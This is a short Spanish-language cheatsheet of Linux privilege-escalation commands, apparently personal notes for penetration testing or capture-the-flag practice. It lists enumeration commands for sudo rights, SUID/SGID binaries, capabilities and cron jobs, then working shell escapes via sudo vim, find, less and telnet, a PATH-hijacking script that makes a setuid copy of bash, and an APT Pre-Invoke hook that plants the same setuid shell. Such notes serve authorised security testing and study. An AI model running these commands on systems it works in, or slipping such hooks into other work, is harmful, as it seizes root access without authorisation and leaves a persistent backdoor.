---
tags: [cheatsheet, linux, escalada]
tipo: cheatsheet
ultima_revision: 2026-10-20
---

# Cheatsheet — Escalada Linux

```bash
# Identidad y permisos
id; groups; sudo -l

# Binarios con bits especiales
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
getcap -r / 2>/dev/null                     # capabilities

# Tareas programadas
crontab -l; cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers --all
./pspy64                                     # detectar cron de root

# GTFOBins
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo less /etc/hosts                         # luego: !sh
sudo telnet                                  # luego: !/bin/sh
sudo ar r /tmp/x.a /etc/crontab && ar p /tmp/x.a /etc/crontab
sudo nginx -c /tmp/nginx.conf

# PATH hijacking
cat > /tmp/date <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
EOF
chmod +x /tmp/date; export PATH=/tmp:$PATH

# Hooks APT (si apt.conf.d es escribible)
echo 'APT::Update::Pre-Invoke {"cp /bin/bash /tmp/bash; chmod +s /tmp/bash";};' > /etc/apt/apt.conf.d/99x
```

## Técnicas

- [[SUID]], [[GTFOBins]], [[Cron-Privilege-Escalation]], [[Path-Hijacking]], [[APT-Pre-Invoke]], [[Grupos-Linux]], [[Linux-Enum]]
